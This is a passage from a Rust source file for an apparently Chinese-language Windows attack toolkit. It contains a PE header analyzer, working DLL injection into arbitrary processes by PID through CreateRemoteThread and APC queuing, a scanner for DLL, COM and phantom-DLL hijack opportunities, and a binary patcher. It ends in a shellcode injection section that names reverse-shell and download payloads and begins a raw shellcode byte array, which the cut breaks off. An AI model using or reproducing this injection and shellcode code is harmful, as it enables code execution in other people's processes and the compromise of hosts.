    out.push_str("\n─── 安全特性 ───\n");
    if dll_chars & 0x0100 != 0 { out.push_str("[+] NX_COMPAT (DEP) 已启用\n"); } else { out.push_str("[!] NX_COMPAT (DEP) 未启用 — 可执行栈!\n"); }
    if dll_chars & 0x0040 != 0 { out.push_str("[+] DYNAMIC_BASE (ASLR) 已启用\n"); } else { out.push_str("[!] DYNAMIC_BASE (ASLR) 未启用 — 固定基址!\n"); }
    if dll_chars & 0x0008 != 0 { out.push_str("[+] FORCE_INTEGRITY (签名强制) 已启用\n"); }
    if dll_chars & 0x0200 != 0 { out.push_str("[+] NO_SEH (SafeSEH) 已启用\n"); }
    if dll_chars & 0x8000 != 0 { out.push_str("[+] CET_COMPAT (Intel CET) 已启用\n"); }
    if dll_chars & 0x4000 != 0 { out.push_str("[+] GUARD_CF (CFG) 已启用\n"); }
    if dll_chars & 0x1000 != 0 { out.push_str("[+] HIGH_ENTROPY_VA (64位ASLR) 已启用\n"); }

    // Stack/Heap
    out.push_str(&format!("\n─── 内存配置 ───\n"));
    out.push_str(&format!("[·] 栈保留: {} MB / 初始提交: {} KB\n", stack_reserve/1024/1024, stack_commit/1024));
    out.push_str(&format!("[·] 堆保留: {} MB / 初始提交: {} KB\n", heap_reserve/1024/1024, heap_commit/1024));

    // LoadConfig (安全cookie/SEH/CFG)
    if load_config_rva > 0 && load_config_size > 0 {
        if let Some(lc_off) = rva_to_offset(load_config_rva, &sections) {
            out.push_str("\n─── LoadConfig 安全信息 ───\n");
            if lc_off + 64 <= data.len() {
                let sec_cookie = if is_x64 { u64_le(&data, lc_off + 48) } else { u32_le(&data, lc_off + 48) as u64 };
                out.push_str(&format!("[·] Security Cookie: 0x{:016X}\n", sec_cookie));
            }
            if lc_off + 100 <= data.len() && is_x64 {
                let guard_cf = u64_le(&data, lc_off + 80);
                if guard_cf != 0 { out.push_str(&format!("[+] CFG Check Function: 0x{:016X}\n", guard_cf)); }
                let guard_cf_dispatch = u64_le(&data, lc_off + 88);
                if guard_cf_dispatch != 0 { out.push_str(&format!("[+] CFG Dispatch: 0x{:016X}\n", guard_cf_dispatch)); }
            }
        }
    }

    // Sections
    out.push_str(&format!("\n─── 节表 ({} 个节) ───\n", num_sections));
    for (name, vaddr, vsize, roff, rsize, chars) in &sections {
        let mut perm = String::new();
        if chars & 0x20000000 != 0 { perm.push('X'); }
        if chars & 0x40000000 != 0 { perm.push('R'); }
        if chars & 0x80000000 != 0 { perm.push('W'); }
        if chars & 0x02000000 != 0 { perm.push('D'); } // discardable
        if chars & 0x10000000 != 0 { perm.push('S'); } // shared
        let ratio = if *vsize > 0 { (*rsize as f64 / *vsize as f64 * 100.0) as u32 } else { 0 };
        out.push_str(&format!("  {:<8}  VA:0x{:08X}  VSz:{:8}  ROff:0x{:08X}  RSz:{:8}  ({:3}%) [{}]\n",
            name, vaddr, vsize, roff, rsize, ratio, perm));
    }

    // Exports
    if export_rva > 0 && export_size > 0 {
        if let Some(exp_off) = rva_to_offset(export_rva, &sections) {
            if let Ok(exports) = parse_exports(&data, exp_off, &sections) {
                out.push_str(&format!("\n─── 导出表 ({} 个函数) ───\n", exports.1.len()));
                out.push_str(&format!("[·] DLL名称: {}\n", exports.0));
                let show = if exports.1.len() > 30 { &exports.1[..30] } else { &exports.1[..] };
                for (ord, name) in show {
                    out.push_str(&format!("  {:4}  {}\n", ord, name));
                }
                if exports.1.len() > 30 { out.push_str(&format!("  ... 还有 {} 个\n", exports.1.len()-30)); }
            }
        }
    }

    // Imports
    if import_rva > 0 && import_size > 0 {
        if let Some(imp_off) = rva_to_offset(import_rva, &sections) {
            if let Ok(imports) = parse_imports(&data, imp_off, &sections) {
                let total_funcs: usize = imports.iter().map(|(_, f)| f.len()).sum();
                out.push_str(&format!("\n─── 导入表 ({} DLLs, {} 函数) ───\n", imports.len(), total_funcs));
                for (dll_name, funcs) in &imports {
                    out.push_str(&format!("  [{}] ({})\n", dll_name, funcs.len()));
                    let show = if funcs.len() > 10 { &funcs[..10] } else { &funcs[..] };
                    for f in show { out.push_str(&format!("    - {}\n", f)); }
                    if funcs.len() > 10 { out.push_str(&format!("    ... 还有 {} 个\n", funcs.len()-10)); }
                }
            }
        }
    }

    // TLS Callbacks (NEW v2.0)
    if tls_rva > 0 && tls_size > 0 {
        if let Some(tls_off) = rva_to_offset(tls_rva, &sections) {
            out.push_str("\n─── TLS 回调 ⚠ ───\n");
            if let Ok(callbacks) = parse_tls(&data, tls_off, is_x64, &sections) {
                if callbacks.is_empty() {
                    out.push_str("[·] 无TLS回调\n");
                } else {
                    for (i, cb) in callbacks.iter().enumerate() {
                        out.push_str(&format!("  [!] TLS回调[{}]: 0x{:016X}\n", i, cb));
                    }
                    out.push_str("[!] TLS回调常用于反调试/反VM — 注意!\n");
                }
            }
        }
    }

    // 重定位 (NEW v2.0)
    if basereloc_rva > 0 && basereloc_size > 0 {
        out.push_str(&format!("\n─── 基址重定位 ───\n"));
        out.push_str(&format!("[·] 重定位表: RVA=0x{:08X} 大小={}KB\n", basereloc_rva, basereloc_size/1024));
        if let Some(reloc_off) = rva_to_offset(basereloc_rva, &sections) {
            let block_count = count_reloc_blocks(&data, reloc_off, basereloc_size as usize);
            out.push_str(&format!("[·] 重定位块: ~{} 个\n", block_count));
        }
    }

    // CLR / .NET (NEW v2.0)
    if clr_rva > 0 && clr_size > 0 {
        out.push_str("\n─── .NET CLR 头 ───\n");
        out.push_str(&format!("[+] 检测到.NET程序集! CLR头: RVA=0x{:08X} 大小={}B\n", clr_rva, clr_size));
        if let Some(clr_off) = rva_to_offset(clr_rva, &sections) {
            if let Ok(info) = parse_clr(&data, clr_off) {
                out.push_str(&info);
            }
        }
    }

    // Resources
    if resource_rva > 0 && resource_size > 0 {
        out.push_str(&format!("\n[·] 资源段: RVA=0x{:08X} 大小={}KB\n", resource_rva, resource_size/1024));
    }

    // Exception table
    if exception_rva > 0 && exception_size > 0 {
        out.push_str(&format!("[·] 异常表: RVA=0x{:08X} 大小={}B ({:.1}KB)\n", exception_rva, exception_size, exception_size as f64/1024.0));
    }

    // Security (数字签名)
    if security_rva > 0 && security_size > 0 {
        out.push_str(&format!("[·] 数字签名: 偏移=0x{:08X} 大小={}KB (存在于文件中)\n", security_rva, security_size/1024));
    }

    // Debug
    if debug_rva > 0 && debug_size > 0 {
        if let Some(dbg_off) = rva_to_offset(debug_rva, &sections) {
            if dbg_off + 4 <= data.len() {
                let dbg_type = u32_le(&data, dbg_off + 12);
                let dbg_type_str = match dbg_type { 1 => "COFF", 2 => "CODEVIEW", 3 => "FPO", 4 => "MISC", 5 => "EXCEPTION", 6 => "FIXUP", 10 => "BORLAND", _ => "未知" };
                out.push_str(&format!("[·] 调试信息: 类型={} ({})\n", dbg_type_str, dbg_type));
            }
        }
    }

    if verbose {
        // IAT 独立检查
        if iat_rva > 0 && iat_size > 0 {
            out.push_str(&format!("\n[·] 独立IAT: RVA=0x{:08X} 大小={}B (绑定导入?)\n", iat_rva, iat_size));
        }
        // Data directory 数量
        out.push_str(&format!("\n[·] 数据目录项: {} 个\n", num_dd.min(16)));
    }

    Ok(out)
}

// TLS 回调解析
fn parse_tls(data: &[u8], off: usize, is_x64: bool, sections: &[(String,u32,u32,u32,u32,u32)]) -> Result<Vec<u64>, String> {
    let mut callbacks = Vec::new();
    // TLS directory: StartAddressOfRawData / EndAddressOfRawData / AddressOfIndex / AddressOfCallBacks
    let cb_rva = if is_x64 { u64_le(data, off + 24) } else { u32_le(data, off + 12) as u64 };
    if cb_rva == 0 { return Ok(callbacks); }

    fn rva_to_off(rva: u32, secs: &[(String,u32,u32,u32,u32,u32)]) -> Option<usize> {
        for &(_, va, vs, ro, rs, _) in secs {
            if rva >= va && rva < va + vs.max(rs) && rs > 0 {
                return Some((ro + (rva - va)) as usize);
            }
        }
        None
    }

    if let Some(cb_off) = rva_to_off(cb_rva as u32, sections) {
        for i in 0..32 { // 最多32个回调
            let ptr_off = cb_off + i * if is_x64 { 8 } else { 4 };
            if ptr_off + 8 > data.len() { break; }
            let addr = if is_x64 { u64_le(data, ptr_off) } else { u32_le(data, ptr_off) as u64 };
            if addr == 0 { break; }
            callbacks.push(addr);
        }
    }
    Ok(callbacks)
}

// 重定位块计数
fn count_reloc_blocks(data: &[u8], mut off: usize, max_size: usize) -> usize {
    let end = (off + max_size).min(data.len());
    let mut count = 0;
    while off + 8 <= end {
        let _page_rva = u32_le(data, off);
        let block_size = u32_le(data, off + 4);
        if block_size == 0 { break; }
        count += 1;
        off += block_size as usize;
    }
    count
}

// CLR 头解析
fn parse_clr(data: &[u8], off: usize) -> Result<String, String> {
    if off + 8 > data.len() { return Err("CLR头越界".into()); }
    let cb = u32_le(data, off);
    if cb < 8 { return Err("CLR头太小".into()); }
    let mut out = String::new();
    if off + 16 <= data.len() {
        let rt_ver = u16_le(data, off + 4);
        let meta_rva = u32_le(data, off + 8);
        let meta_size = u32_le(data, off + 12);
        let flags = u32_le(data, off + 16);
        out.push_str(&format!("[·] 运行时版本: v{}.{}\n", rt_ver >> 8, rt_ver & 0xFF));
        out.push_str(&format!("[·] 元数据: RVA=0x{:08X} 大小={}B\n", meta_rva, meta_size));
        let mut flag_strs = Vec::new();
        if flags & 0x01 != 0 { flag_strs.push("ILONLY"); }
        if flags & 0x02 != 0 { flag_strs.push("32BITREQUIRED"); }
        if flags & 0x04 != 0 { flag_strs.push("STRONGNAMESIGNED"); }
        if flags & 0x08 != 0 { flag_strs.push("NATIVE_ENTRYPOINT"); }
        if flags & 0x10 != 0 { flag_strs.push("TRACKDEBUGDATA"); }
        if flags & 0x20 != 0 { flag_strs.push("32BITPREFERRED"); }
        out.push_str(&format!("[·] 标志: {}\n", flag_strs.join(" | ")));
    }
    Ok(out)
}

// ═══════════════ PE 辅助函数 ═══════════════

fn parse_exports(data: &[u8], offset: usize, sections: &[(String,u32,u32,u32,u32,u32)]) -> Result<(String, Vec<(u16, String)>), String> {
    if offset + 40 > data.len() { return Err("导出表越界".into()); }
    let name_rva = u32_le(data, offset + 12);
    let ordinal_base = u32_le(data, offset + 16) as u16;
    let _num_funcs = u32_le(data, offset + 20) as usize;
    let num_names = u32_le(data, offset + 24) as usize;
    let _funcs_rva = u32_le(data, offset + 28);
    let names_rva = u32_le(data, offset + 32);
    let ords_rva = u32_le(data, offset + 36);

    fn rva_to_off(rva: u32, sections: &[(String,u32,u32,u32,u32,u32)]) -> usize {
        for &(_, vaddr, vsize, roff, rsize, _) in sections {
            if rva >= vaddr && rva < vaddr + vsize.max(rsize) && rsize > 0 {
                return (roff + (rva - vaddr)) as usize;
            }
        }
        rva as usize
    }

    let dll_name = if name_rva == 0 { "未知".to_string() } else {
        let o = rva_to_off(name_rva, sections);
        if o < data.len() {
            let end = data[o..].iter().position(|&b| b==0).map(|i| o+i).unwrap_or(data.len());
            String::from_utf8_lossy(&data[o..end.min(data.len())]).to_string()
        } else { "OOB".into() }
    };

    let mut exports = Vec::new();
    let names_off = rva_to_off(names_rva, sections);
    let ords_off = rva_to_off(ords_rva, sections);
    for i in 0..num_names.min(2000) {
        if names_off + i*4 + 4 > data.len() { break; }
        if ords_off + i*2 + 2 > data.len() { break; }
        let name_rva_val = u32_le(data, names_off + i*4);
        let ord_idx = u16_le(data, ords_off + i*2);
        let ordinal = ordinal_base + ord_idx;
        let name = if name_rva_val > 0 {
            let start = rva_to_off(name_rva_val, sections);
            if start < data.len() {
                let end = data[start..].iter().position(|&b| b==0).map(|p| start+p).unwrap_or(data.len());
                String::from_utf8_lossy(&data[start..end.min(data.len())]).to_string()
            } else { format!("Ordinal_{}", ordinal) }
        } else { format!("Ordinal_{}", ordinal) };
        if !name.is_empty() { exports.push((ordinal, name)); }
    }
    Ok((dll_name, exports))
}

fn parse_imports(data: &[u8], offset: usize, sections: &[(String,u32,u32,u32,u32,u32)]) -> Result<Vec<(String, Vec<String>)>, String> {
    fn rva_to_off(rva: u32, sections: &[(String,u32,u32,u32,u32,u32)]) -> usize {
        for &(_, vaddr, vsize, roff, rsize, _) in sections {
            if rva >= vaddr && rva < vaddr + vsize.max(rsize) && rsize > 0 {
                return (roff + (rva - vaddr)) as usize;
            }
        }
        rva as usize
    }

    let mut imports = Vec::new();
    let mut i = 0;
    loop {
        let off = offset + i * 20;
        if off + 20 > data.len() { break; }
        let name_rva = u32_le(data, off + 12);
        if name_rva == 0 { break; }
        let iat_rva = u32_le(data, off);

        let dll_name = {
            let o = rva_to_off(name_rva, sections);
            if o < data.len() {
                let end = data[o..].iter().position(|&b| b==0).map(|j| o+j).unwrap_or(data.len());
                String::from_utf8_lossy(&data[o..end.min(data.len())]).to_string()
            } else { break; }
        };

        let mut funcs = Vec::new();
        if let Some(iat_off) = {
            let iat_off = rva_to_off(iat_rva, sections);
            if iat_off < data.len() { Some(iat_off) } else { None }
        } {
            let mut j = 0;
            while iat_off + j*8 + 8 <= data.len() {
                let nf = u32_le(data, iat_off + j*8 + 4);
                let name_rva_field = if nf == 0 { u32_le(data, iat_off + j*8) } else { nf };
                if name_rva_field == 0 { break; }
                if name_rva_field & 0x80000000 != 0 {
                    funcs.push(format!("Ord(0x{:04X})", name_rva_field & 0x7FFF));
                } else {
                    let no = rva_to_off(name_rva_field, sections);
                    if no + 2 < data.len() {
                        let name = String::from_utf8_lossy(&data[no+2..data[no+2..].iter().position(|&b| b==0).map(|p| no+2+p).unwrap_or(data.len())]).to_string();
                        funcs.push(name);
                    }
                }
                j += 1;
            }
        }
        imports.push((dll_name, funcs));
        i += 1;
    }
    Ok(imports)
}

fn u16_le(d: &[u8], off: usize) -> u16 { u16::from_le_bytes([d[off], d[off+1]]) }
fn u32_le(d: &[u8], off: usize) -> u32 { u32::from_le_bytes([d[off], d[off+1], d[off+2], d[off+3]]) }
fn u64_le(d: &[u8], off: usize) -> u64 { u64::from_le_bytes([d[off],d[off+1],d[off+2],d[off+3],d[off+4],d[off+5],d[off+6],d[off+7]]) }

fn unix_to_str(ts: u32) -> String {
    let secs = ts as i64;
    let days = secs / 86400;
    let years = 1970 + days / 365;
    let rem = days % 365;
    let months = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
    let month_days = [31,28,31,30,31,30,31,31,30,31,30,31];
    let mut m = 0; let mut d = rem;
    for (i, &md) in month_days.iter().enumerate() { if d >= md { d -= md; m = i+1; } else { m = i; break; } }
    if m >= 12 { m = 11; }
    let h = (secs % 86400) / 3600;
    let min = (secs % 3600) / 60;
    let s = secs % 60;
    format!("{:02} {} {} {:02}:{:02}:{:02}", d+1, months[m], years, h, min, s)
}

fn hex_to_bytes(hex_str: &str) -> Result<Vec<u8>, String> {
    let clean = hex_str.replace(" ", "").replace("0x", "").replace("0X", "").replace(",", "");
    if clean.len() % 2 != 0 { return Err("HEX长度必须为偶数".into()); }
    let mut bytes = Vec::new();
    for i in (0..clean.len()).step_by(2) {
        bytes.push(u8::from_str_radix(&clean[i..i+2], 16).map_err(|e| format!("HEX解析失败: {}", e))?);
    }
    Ok(bytes)
}

fn parse_offset(offset_str: &str) -> Result<usize, String> {
    if offset_str.starts_with("0x") || offset_str.starts_with("0X") {
        usize::from_str_radix(&offset_str[2..], 16).map_err(|e| format!("偏移解析: {}", e))
    } else {
        offset_str.parse::<usize>().map_err(|e| format!("偏移解析: {}", e))
    }
}

// ═══════════════ DLL 注入 v2.0 (CreateRemoteThread + APC) ═══════════════

fn dll_inject_cmd(pid_str: &str, dll_path: &str, method: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;

    let dll_abs = std::fs::canonicalize(dll_path).map_err(|e| format!("DLL路径无效: {}", e))?;
    let dll_str = dll_abs.to_string_lossy().to_string();
    if !std::path::Path::new(&dll_str).exists() { return Err(format!("DLL不存在: {}", dll_str)); }

    msg_tagged("dll_inject_status", &format!("[*] 目标PID: {} | DLL: {} | 方法: {}", pid, dll_str, method));

    match method {
        "apc" => inject_apc(pid, &dll_str),
        _ => inject_crt(pid, &dll_str),
    }
}

fn inject_crt(pid: u32, dll_str: &str) -> Result<String, String> {
    let pbar = progress_create("dll_crack", "inject_crt", "DLL注入(CRT)", 5);

    progress_update(&pbar, 1, "打开目标进程...");
    let h_proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程 {}: {}", pid, w32_err()));
    }

    progress_update(&pbar, 2, "分配远程内存...");
    let dll_bytes = dll_str.as_bytes();
    let dll_len = dll_bytes.len() + 1;
    let remote_mem = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) };
    if remote_mem.is_null() { unsafe { CloseHandle(h_proc); } return Err(format!("VirtualAllocEx: {}", w32_err())); }

    progress_update(&pbar, 3, "写入DLL路径...");
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, remote_mem, dll_bytes.as_ptr() as LPVOID, dll_bytes.len(), &mut written) };
    if ret == 0 || written != dll_bytes.len() {
        unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); }
        return Err(format!("WriteProcessMemory: {}", w32_err()));
    }

    progress_update(&pbar, 4, "解析LoadLibraryA...");
    let k32 = b"kernel32.dll\0";
    let ll = b"LoadLibraryA\0";
    let h_k32 = unsafe { GetModuleHandleA(k32.as_ptr()) };
    let ll_addr = unsafe { GetProcAddress(h_k32, ll.as_ptr()) };
    if ll_addr.is_null() { unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); } return Err("LoadLibraryA not found".into()); }

    progress_update(&pbar, 5, "CreateRemoteThread...");
    let h_thread = unsafe { CreateRemoteThread(h_proc, std::ptr::null_mut(), 0, ll_addr as LPTHREAD_START_ROUTINE, remote_mem, 0, std::ptr::null_mut()) };
    if h_thread.is_null() { unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); } return Err(format!("CreateRemoteThread: {}", w32_err())); }

    unsafe { WaitForSingleObject(h_thread, 5000); }
    unsafe { CloseHandle(h_thread); CloseHandle(h_proc); }
    progress_finish(&pbar);

    msg_tagged("dll_inject_status", &format!("[+] 注入完成! PID:{} DLL:{} @{:p}", pid, dll_str, remote_mem));
    Ok(format!("DLL注入成功 (CreateRemoteThread)\n  目标PID: {}\n  DLL: {}\n  远程地址: {:p}", pid, dll_str, remote_mem))
}

fn inject_apc(pid: u32, dll_str: &str) -> Result<String, String> {
    let pbar = progress_create("dll_crack", "inject_apc", "DLL注入(APC)", 6);

    progress_update(&pbar, 1, "打开目标进程...");
    let h_proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程 {}: {}", pid, w32_err()));
    }

    progress_update(&pbar, 2, "分配远程内存...");
    let dll_bytes = dll_str.as_bytes();
    let dll_len = dll_bytes.len() + 1;
    let remote_mem = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) };
    if remote_mem.is_null() { unsafe { CloseHandle(h_proc); } return Err(format!("VirtualAllocEx: {}", w32_err())); }

    progress_update(&pbar, 3, "写入DLL路径...");
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, remote_mem, dll_bytes.as_ptr() as LPVOID, dll_bytes.len(), &mut written) };
    if ret == 0 || written != dll_bytes.len() {
        unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); }
        return Err(format!("WriteProcessMemory: {}", w32_err()));
    }

    progress_update(&pbar, 4, "解析LoadLibraryA...");
    let k32 = b"kernel32.dll\0";
    let ll = b"LoadLibraryA\0";
    let h_k32 = unsafe { GetModuleHandleA(k32.as_ptr()) };
    let ll_addr = unsafe { GetProcAddress(h_k32, ll.as_ptr()) };
    if ll_addr.is_null() { unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); } return Err("LoadLibraryA not found".into()); }

    progress_update(&pbar, 5, "枚举线程+QueueUserAPC...");
    let h_snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    if h_snap == INVALID_HANDLE_VALUE { unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); } return Err(w32_err()); }

    let mut te: THREADENTRY32 = unsafe { std::mem::zeroed() };
    te.dw_size = std::mem::size_of::<THREADENTRY32>() as u32;
    let mut apc_count = 0u32;
    unsafe { Thread32First(h_snap, &mut te); }
    loop {
        if te.th32_owner_process_id == pid {
            let h_thread = unsafe { OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, 0, te.th32_thread_id) };
            if !h_thread.is_null() && h_thread != INVALID_HANDLE_VALUE {
                let ret = unsafe { QueueUserAPC(ll_addr as FARPROC, h_thread, remote_mem as ULONG_PTR) };
                if ret != 0 { apc_count += 1; }
                unsafe { CloseHandle(h_thread); }
            }
        }
        if unsafe { Thread32Next(h_snap, &mut te) } == 0 { break; }
    }
    unsafe { CloseHandle(h_snap); CloseHandle(h_proc); }

    progress_update(&pbar, 6, &format!("APC已排队: {} 个线程", apc_count));
    progress_finish(&pbar);

    if apc_count == 0 {
        return Err("没有线程可注入APC — 目标进程可能已暂停或线程不可访问".into());
    }

    msg_tagged("dll_inject_status", &format!("[+] APC注入完成! PID:{} DLL:{} 线程:{}", pid, dll_str, apc_count));
    Ok(format!("DLL注入成功 (APC)\n  目标PID: {}\n  DLL: {}\n  APC排队线程: {}\n  [!] DLL将在每个线程进入alertable状态时加载", pid, dll_str, apc_count))
}

// ═══════════════ DLL 劫持扫描 v2.0 (PATH + COM + Phantom) ═══════════════

fn dll_hijack_cmd(scan_mode: &str) -> Result<String, String> {
    let target_dlls = [
        "version.dll", "userenv.dll", "cryptbase.dll", "profapi.dll", "winsta.dll",
        "dwmapi.dll", "ws2_32.dll", "dbghelp.dll", "msimg32.dll", "riched20.dll",
        "vulkan-1.dll", "libcurl.dll", "sqlite3.dll", "libeay32.dll", "ssleay32.dll",
        "zlib1.dll", "usp10.dll", "propsys.dll", "cscapi.dll", "ntmarta.dll",
    ];

    let pbar = progress_create("dll_crack", "hijack", "劫持扫描", 4);
    let mut out = String::from("═══ DLL 劫持扫描 v2.0 ═══\n\n");

    // 1. PATH扫描
    if scan_mode == "path" || scan_mode == "all" {
        progress_update(&pbar, 1, "扫描PATH可写目录...");
        out.push_str("─── PATH可写目录 ───\n");
        let mut writable_dirs = Vec::new();
        if let Ok(path_var) = std::env::var("PATH") {
            for dir in path_var.split(';') {
                let p = std::path::Path::new(dir);
                if p.exists() {
                    if let Ok(m) = p.metadata() {
                        if !m.permissions().readonly() {
                            writable_dirs.push(dir.to_string());
                            out.push_str(&format!("  [!] 可写: {}\n", dir));
                        }
                    }
                }
            }
        }
        if writable_dirs.is_empty() { out.push_str("  [·] 未发现可写PATH目录\n"); }
        out.push_str(&format!("\n[·] PATH可写目录: {} 个\n", writable_dirs.len()));
    }

    // 2. 当前目录劫持
    if scan_mode == "path" || scan_mode == "all" {
        progress_update(&pbar, 2, "扫描当前目录DLL劫持...");
        out.push_str("\n─── 当前目录DLL劫持 ───\n");
        let cur_dir = std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("."));
        out.push_str(&format!("[·] 扫描目录: {}\n", cur_dir.display()));
        let dir_writable = cur_dir.metadata().map(|m| !m.permissions().readonly()).unwrap_or(false);
        if dir_writable {
            let mut found = 0u32;
            for dll in &target_dlls {
                if cur_dir.join(dll).exists() { found += 1; out.push_str(&format!("  [·] 已存在: {}\n", dll)); }
            }
            let missing = target_dlls.len() - found as usize;
            out.push_str(&format!("[!] 目录可写! 缺失DLL: {} 个可劫持\n", missing));
            if missing > 0 {
                out.push_str("[+] 常见劫持目标:\n");
                for dll in &target_dlls {
                    if !cur_dir.join(dll).exists() {
                        out.push_str(&format!("  -> {} (不存在于当前目录)\n", dll));
                    }
                }
            }
        } else { out.push_str("[·] 当前目录不可写\n"); }
    }

    // 3. COM劫持扫描
    if scan_mode == "com" || scan_mode == "all" {
        progress_update(&pbar, 3, "扫描COM劫持机会...");
        out.push_str("\n─── COM劫持扫描 ───\n");
        let _com_keys = [
            r"HKCU\Software\Classes\CLSID",
            r"HKLM\Software\Classes\CLSID",
        ];
        // 常见被劫持的COM InProcServer32键
        let common_com_dlls = ["mscoree.dll", "mscorsvw.dll", "msxml3.dll", "msxml6.dll"];
        out.push_str("[·] 检查常见COM DLL在当前目录的存在性:\n");
        for dll in &common_com_dlls {
            let cur = std::path::Path::new(dll);
            if cur.exists() {
                out.push_str(&format!("  [·] {} 已存在于当前目录\n", dll));
            } else {
                out.push_str(&format!("  [!] {} 缺失 — 可被COM劫持利用\n", dll));
            }
        }
        out.push_str("[*] COM劫持原理: 在注册表中将CLSID的InProcServer32指向伪造DLL\n");
        out.push_str("[*] 常用利用工具: COMahawk (https://github.com/apt69/COMahawk)\n");
    }

    // 4. Phantom DLL
    if scan_mode == "phantom" || scan_mode == "all" {
        progress_update(&pbar, 4, "扫描Phantom DLL...");
        out.push_str("\n─── Phantom DLL 扫描 ───\n");
        let phantom_dlls = [
            "wow64log.dll", "fxsst.dll", "wbemcomn.dll", "cryptsp.dll",
            "midimap.dll", "mshtml.dll", "srclient.dll", "edgegdi.dll",
            "wshbth.dll", "wlbsctrl.dll", "msfte.dll", "cqmghost.dll",
        ];
        let sys32 = std::path::Path::new(r"C:\Windows\System32");
        let syswow64 = std::path::Path::new(r"C:\Windows\SysWOW64");
        for dll in &phantom_dlls {
            let p32 = sys32.join(dll);
            let p64 = syswow64.join(dll);
            let stat32 = if p32.exists() { "存在" } else { "缺失" };
            let stat64 = if p64.exists() { "存在" } else { "缺失" };
            out.push_str(&format!("  [·] {} — System32:{} | SysWOW64:{}\n", dll, stat32, stat64));
        }
        out.push_str("[*] Phantom DLL: 某些程序尝试加载不存在的DLL,放入搜索路径即可劫持\n");
    }

    progress_finish(&pbar);
    Ok(out)
}

// ═══════════════ DLL 二进制修补 v2.0 (签名感知) ═══════════════

fn dll_patch_cmd(path: &str, offset_str: &str, hex_str: &str) -> Result<String, String> {
    let offset = parse_offset(offset_str)?;
    let bytes = hex_to_bytes(hex_str)?;

    // 备份
    let bak_path = format!("{}.bak", path);
    std::fs::copy(path, &bak_path).map_err(|e| format!("备份失败: {}", e))?;

    let mut data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if offset + bytes.len() > data.len() {
        std::fs::remove_file(&bak_path).ok();
        return Err(format!("偏移+长度({})超出文件大小({})", offset + bytes.len(), data.len()));
    }

    let orig_hex: Vec<String> = data[offset..offset+bytes.len()].iter().map(|b| format!("{:02X}", b)).collect();

    // 检查是否影响数字签名范围
    let sig_offset_opt = find_security_dir_offset(&data);
    let mut sig_warning = false;
    if let Some(sig_off) = sig_offset_opt {
        if offset < sig_off + 8 && offset + bytes.len() > sig_off {
            sig_warning = true;
        }
    }

    for (i, &b) in bytes.iter().enumerate() { data[offset + i] = b; }
    std::fs::write(path, &data).map_err(|e| format!("写入失败: {}", e))?;

    let new_hex: Vec<String> = bytes.iter().map(|b| format!("{:02X}", b)).collect();
    let mut out = String::from("═══ DLL修补完成 ═══\n\n");
    out.push_str(&format!("[+] 文件: {}\n", path));
    out.push_str(&format!("[+] 备份: {}\n", bak_path));
    out.push_str(&format!("[+] 偏移: 0x{:08X} ({})\n", offset, offset));
    out.push_str(&format!("[+] 原始: {}\n", orig_hex.join(" ")));
    out.push_str(&format!("[+] 新值: {}\n", new_hex.join(" ")));
    out.push_str(&format!("[+] 长度: {} 字节\n", bytes.len()));
    if sig_warning { out.push_str("\n[!] ⚠ 补丁覆盖了数字签名区域 — PE签名验证将失败!\n"); }
    out.push_str("\n[!] 回滚: 复制 .bak 覆盖原文件\n");
    Ok(out)
}

fn find_security_dir_offset(data: &[u8]) -> Option<usize> {
    if data.len() < 64 { return None; }
    let pe_off = u32_le(data, 0x3C) as usize;
    if pe_off + 4 > data.len() { return None; }
    if u32_le(data, pe_off) != 0x4550 { return None; }
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(data, opt_start);
    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
    let sec_rva = u32_le(data, dd_start + 32);
    let sec_size = u32_le(data, dd_start + 36);
    if sec_rva > 0 && sec_size > 0 { Some(sec_rva as usize) } else { None }
}

// ═══════════════ Shellcode 注入 v2.0 (messagebox/cmd/calc/revshell/download) ═══════════════

const MSGBOX_X64: &[u8] = &[
    0xFC,0x48,0x81,0xE4,0xF0,0xFF,0xFF,0xFF,0xE8,0xD0,0x00,0x00,0x00,0x41,0x51,
    0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x3E,0x48,
    0x8B,0x52,0x18,0x3E,0x48,0x8B,0x52,0x20,0x3E,0x48,0x8B,0x72,0x50,0x3E,0x48,
    0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,
    0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x3E,
    0x48,0x8B,0x52,0x20,0x3E,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x3E,0x8B,0x80,0x88,
